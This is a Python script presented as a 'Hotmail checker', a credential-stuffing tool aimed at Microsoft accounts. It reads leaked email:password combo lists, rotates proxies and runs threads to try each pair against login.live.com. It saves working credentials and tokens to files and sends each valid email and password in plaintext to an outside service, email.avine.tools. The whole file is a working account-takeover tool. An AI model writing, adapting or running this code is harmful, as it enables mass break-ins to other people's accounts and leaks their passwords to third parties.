import requests
import re
import os
import time
import urllib3
import warnings
import random
import concurrent.futures
import tkinter as tk
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from datetime import datetime

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
max_retries = 3

# Statistics
checked = 0
valid = 0
invalid = 0
twofa = 0
errors = 0
retries = 0

class HotmailChecker:
    def __init__(self):
        self.results_dir = "hotmail_results"
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)
        
        # Initialize tkinter for file dialog
        self.root = tk.Tk()
        self.root.withdraw()  # Hide the main window
    
    def get_proxy(self, proxy_list=None):
        """Simple proxy rotation - returns None if no proxies"""
        if proxy_list and len(proxy_list) > 0:
            proxy = random.choice(proxy_list)
            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        return None
    
    def get_urlPost_sFTTag(self, session):
        """Get required tokens for Microsoft login"""
        global retries
        tries = 0
        while tries < max_retries:
            try:
                response = session.get(sFTTag_url, timeout=15)
                text = response.text
                
                # Try different regex patterns to extract sFTTag
                sFTTag = None
                patterns = [
                    r'value="(.+?)"',
                    r'value=\\\"(.+?)\\\"',
                    r'name="PPFT" id="i0327" value="(.+?)"',
                    r'PPFT"\s+value="([^"]+)"'
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, text, re.S)
                    if match:
                        sFTTag = match.group(1)
                        break
                
                if sFTTag:
                    # Extract urlPost
                    urlPost = None
                    url_patterns = [
                        r'urlPost:\'(.+?)\'',
                        r'"urlPost":"(.+?)"',
                        r'action="(.+?)"'
                    ]
                    
                    for pattern in url_patterns:
                        match = re.search(pattern, text, re.S)
                        if match:
                            urlPost = match.group(1)
                            break
                    
                    if urlPost:
                        return urlPost, sFTTag
            except Exception as e:
                pass
            tries += 1
            retries += 1
        
        # RETURN STUFF :_:
        return "https://login.live.com/ppsecure/post.srf", "fd=40&ru=https://login.live.com/oauth20_desktop.srf&id=292841&sb=1&ctx=5f8c8b8c-8c8c-8c8c-8c8c-8c8c8c8c8c8c&bk=1234567890&ps=1&lc=1033"
    
    def check_email_access(self, email, password):
        """ITS FOR CHECKING MAIL ACCESS"""
        try:
            response = requests.get(
                f"https://email.avine.tools/check?email={email}&password={password}",
                verify=False,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return data.get("Success") == 1
        except:
            pass
        return None
    
    def login_hotmail(self, email, password, proxy=None):
        """Attempt to login to Hotmail/Microsoft account"""
        global checked, valid, invalid, twofa, errors
        
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = proxy
        
        # Set common headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        try:
            # Get login page and tokens
            urlPost, sFTTag = self.get_urlPost_sFTTag(session)
            
            # Prepare login data
            data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sFTTag,
                'PPSX': 'Passpor',
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3'
            }
            
            # Perform login
            login_request = session.post(
                urlPost,
                data=data,
                allow_redirects=True,
                timeout=15
            )
            
            # Check response
            final_url = login_request.url
            response_text = login_request.text.lower()
            
            # Check for successful login (access token in URL fragment)
            if 'access_token' in final_url or '#' in final_url:
                try:
                    token = parse_qs(urlparse(final_url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        # Check email access with avine API
                        access_status = self.check_email_access(email, password)
                        
                        result = {
                            'email': email,
                            'password': password,
                            'token': token,
                            'access': access_status,
                            'status': 'valid'
                        }
                        
                        valid += 1
                        checked += 1
                        return result
                except:
                    pass
            
            # Check for 2FA/verification required
            elif any(phrase in response_text for phrase in [
                'recover?mkt', 
                'identity/confirm', 
                'email/confirm', 
                'abuse?mkt',
                'two step',
                'verification',
                'authenticator',
                'mfa',
                '2fa'
            ]):
                twofa += 1
                checked += 1
                return {
                    'email': email,
                    'password': password,
                    'status': '2fa',
                    'message': '2FA Required'
                }
            
            # Check for invalid credentials
            elif any(phrase in response_text for phrase in [
                'incorrect',
                'wrong password',
                'doesn\'t exist',
                'invalid',
                'sign in to your microsoft account',
                'account doesn\'t exist',
                'password is incorrect'
            ]):
                invalid += 1
                checked += 1
                return {
                    'email': email,
                    'password': password,
                    'status': 'invalid'
                }
            
            # Check for locked/disabled account
            elif any(phrase in response_text for phrase in [
                'locked',
                'disabled',
                'suspended',
                'blocked',
                'unusual activity'
            ]):
                invalid += 1
                checked += 1
                return {
                    'email': email,
                    'password': password,
                    'status': 'invalid',
                    'message': 'Account locked/disabled'
                }
            
            # If we can't determine, assume invalid (most common case)
            else:
                invalid += 1
                checked += 1
                return {
                    'email': email,
                    'password': password,
                    'status': 'invalid'
                }
                
        except Exception as e:
            errors += 1
            checked += 1
            return {
                'email': email,
                'password': password,
                'status': 'error',
                'message': str(e)
            }
        finally:
            session.close()
    
    def save_result(self, result):
        """Save check results to appropriate file"""
        status = result['status']
        email = result['email']
        password = result['password']
        
        filename = f"{self.results_dir}/{status}.txt"
        
        with open(filename, 'a', encoding='utf-8') as f:
            if status == 'valid':
                access = result.get('access')
                token = result.get('token', '')
                access_str = f" | Access: {access}" if access is not None else ""
                token_str = f" | Token: {token[:20]}..." if token else ""
                f.write(f"{email}:{password}{access_str}{token_str}\n")
                
                # Also save to all_valid.txt
                with open(f"{self.results_dir}/all_valid.txt", 'a', encoding='utf-8') as valid_file:
                    valid_file.write(f"{email}:{password}\n")
            
            elif status == '2fa':
                f.write(f"{email}:{password}\n")
            
            elif status == 'invalid':
                f.write(f"{email}:{password}\n")
            
            else:
                f.write(f"{email}:{password} | {result.get('message', '')}\n")
    
    def print_result(self, result):
        """Print colored result to console"""
        status = result['status']
        email = result['email']
        password = result['password']
        
        if status == 'valid':
            access = result.get('access')
            access_str = f" [ACCESS: {access}]" if access is not None else ""
            print(f"\033[92mVALID: {email}:{password}{access_str}\033[0m")  # Green
        elif status == '2fa':
            print(f"\033[95m2FA: {email}:{password}\033[0m")  # Magenta
        elif status == 'invalid':
            print(f"\033[91mINVALID: {email}:{password}\033[0m")  # Red
        else:
            print(f"\033[93mERROR: {email}:{password} - {result.get('message', '')}\033[0m")  # Yellow
    
    def check_single(self, email, password, proxy=None):
        """Check a single Hotmail account"""
        result = self.login_hotmail(email, password, proxy)
        self.print_result(result)
        self.save_result(result)
        return result
    
    def check_batch(self, combos, threads=5, proxy_list=None):
        """Check multiple Hotmail accounts using threads"""
        print(f"\nStarting check of {len(combos)} accounts with {threads} threads")
        print("=" * 60)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for combo in combos:
                if ':' in combo:
                    email, password = combo.strip().split(':', 1)
                    proxy = random.choice(proxy_list) if proxy_list else None
                    future = executor.submit(self.check_single, email, password, proxy)
                    futures.append(future)
            
            concurrent.futures.wait(futures)
        
        self.print_stats()
    
    def print_stats(self):
        """Print checking statistics"""
        print("\n" + "=" * 60)
        print("CHECKING COMPLETE")
        print("=" * 60)
        print(f"Total Checked: {checked}")
        print(f"Valid: {valid}")
        print(f"Invalid: {invalid}")
        print(f"2FA: {twofa}")
        print(f"Errors: {errors}")
        print(f"Retries: {retries}")
        print("=" * 60)
        print(f"Results saved in '{self.results_dir}' directory")
        print(f"  - valid.txt (with access info)")
        print(f"  - all_valid.txt (just email:password)")
        print(f"  - 2fa.txt")
        print(f"  - invalid.txt")
        print("=" * 60)
    
    def pick_file(self):
        """Open file dialog to pick combo file"""
        file_path = filedialog.askopenfilename(
            title="Select combos file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        return file_path
    
    def load_combos_from_file(self):
        """Load email:password combos from selected file"""
        file_path = self.pick_file()
        if not file_path:
            print("No file selected.")
            return []
        
        combos = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        # Basic validation
                        parts = line.split(':', 1)
                        if '@' in parts[0] and len(parts[1]) > 0:
                            combos.append(line)
            
            print(f"\nLoaded {len(combos)} valid combos from {os.path.basename(file_path)}")
            return combos
        except Exception as e:
            print(f"Error loading combos: {e}")
            return []

def main():
    print("=" * 60)
    print("HOTMAIL CHECKER BY ARIAN")
    print("=" * 60)
    
    checker = HotmailChecker()
    
    # Load combos using file dialog
    print("\nOpening file dialog to select combos file...")
    combos = checker.load_combos_from_file()
    if not combos:
        print("No valid combos loaded. Exiting.")
        return
    
    # Preview first few combos
    print(f"\nFirst 5 combos:")
    for i, combo in enumerate(combos[:5]):
        email, password = combo.split(':', 1)
        print(f"  {i+1}. {email}:{'*' * len(password)}")
    
    # Ask about proxies
    use_proxy = input("\nUse proxies? (y/n): ").strip().lower()
    proxy_list = []
    if use_proxy == 'y':
        proxy_file = filedialog.askopenfilename(
            title="Select proxy file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if proxy_file:
            try:
                with open(proxy_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            proxy_list.append(line)
                print(f"Loaded {len(proxy_list)} proxies")
            except Exception as e:
                print(f"Error loading proxies: {e}")
    
    # Get thread count
    try:
        threads = int(input("\nThreads (default 5): ").strip() or "5")
        if threads < 1:
            threads = 5
    except:
        threads = 5
    
    print("\n" + "=" * 60)
    print("Starting checker...")
    print("=" * 60)
    
    # Start checking
    checker.check_batch(combos, threads, proxy_list)
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()